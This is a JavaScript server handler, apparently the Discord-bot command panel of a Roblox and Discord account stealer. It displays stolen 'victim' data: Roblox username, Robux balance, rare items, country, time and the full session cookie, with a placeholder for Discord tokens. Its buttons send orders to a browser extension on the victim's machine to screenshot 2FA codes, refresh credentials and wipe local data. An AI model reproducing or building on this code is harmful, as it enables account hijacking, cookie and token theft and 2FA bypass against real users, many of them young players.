// api/interaction.js - VERSIÓN QUE RESPONDE CORRECTAMENTE AL PING Y PROCESA BOTONES
export default function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const interaction = req.body;

    // ========== RESPUESTA AL PING (OBLIGATORIO) ==========
    if (interaction.type === 1) {
        return res.status(200).json({ type: 1 });
    }

    // ========== PROCESAR BOTÓN CLICKEADO ==========
    if (interaction.type === 3) {
        const customId = interaction.data.custom_id;
        
        // CORRECCIÓN: Unir todas las partes después de la acción
        const partes = customId.split('_');
        const action = partes[0];
        const userId = partes.slice(1).join('_');

        // Obtener datos de la víctima
        const victimData = global.victims?.[userId] || {};
        const r = victimData.roblox || {};

        // Respuesta para ROBLOX
        if (action === 'roblox') {
            const mensaje = `||@here||
🔔 ¡Informacion seleccionada: **ROBLOX**!

**📌 PRINCIPAL **
👤 Usuario Roblox: ${r.username || 'No disponible'}
🆔 ID: ${r.userId || 'No disponible'}
💰 Robux: ${r.robux || 0}
⭐ Seguidores: ${r.seguidores || 0}
👥 Amigos: ${r.amigos || 0}
💱 Premium: ${r.premium || 'No'}
🔰 Verificado: ${r.verified || 'No'}

💼 **Inventario:**
Headless: \`${r.headless || 'No'}\`
Korblox: \`${r.korblox || 'No'}\`

**🌐 Informacion Horaria:**
🌍 País: \`${victimData.pais || 'Desconocido'}\`
📅 Fecha: \`${victimData.fecha || ''}\`
⏰ Hora Exacta: \`${victimData.hora || ''}\`

🍪 Cookie:
\`\`\`${victimData.cookie || 'No disponible'}\`\`\``;

            return res.status(200).json({
                type: 4,
                data: { content: mensaje, flags: 64 }
            });
        }

        // Respuesta para DISCORD
        if (action === 'discord') {
            const mensaje = `||@here||
🔔 ¡Informacion seleccionada: **DISCORD**!

**📌 PRINCIPAL **
👤 Usuario Discord: (No disponible)
🆔 ID de Discord: (No disponible)
👥 Amigos: (No disponible)
💱 Discord nitro: (No disponible)

**🌐 Informacion Horaria:**
🌍 País: \`${victimData.pais || 'Desconocido'}\`
📅 Fecha: \`${victimData.fecha || ''}\`
⏰ Hora Exacta: \`${victimData.hora || ''}\`

✨ Token de sesión:
\`\`\`No disponible\`\`\``;

            return res.status(200).json({
                type: 4,
                data: { content: mensaje, flags: 64 }
            });
        }

        // Respuesta para COMANDOS
        if (action === 'comandos') {
            return res.status(200).json({
                type: 4,
                data: {
                    content: `||@here||
✏️ **¡ Comandos seleccionados ! **
Elige Una Opcion:`,
                    flags: 64,
                    components: [
                        {
                            type: 1,
                            components: [
                                { type: 2, style: 4, label: '📸 Capturar pantalla del 2FA', custom_id: `capturar_pantalla_${userId}` }
                            ]
                        },
                        {
                            type: 1,
                            components: [
                                { type: 2, style: 1, label: '🔄 Actualizar credenciales', custom_id: `actualizar_credenciales_${userId}` }
                            ]
                        },
                        {
                            type: 1,
                            components: [
                                { type: 2, style: 4, label: '🗑️ Limpiar datos locales', custom_id: `limpiar_datos_${userId}` }
                            ]
                        }
                    ]
                }
            });
        }

        // Guardar subcomandos para la extensión
        if (!global.commands) global.commands = {};
        if (!global.commands[userId]) global.commands[userId] = [];
        global.commands[userId].push({ action: action });

        return res.status(200).json({
            type: 4,
            data: {
                content: `✅ Orden \`${action}\` enviada a la víctima.`,
                flags: 64
            }
        });
    }

    return res.status(400).json({ error: 'Unhandled interaction type' });
}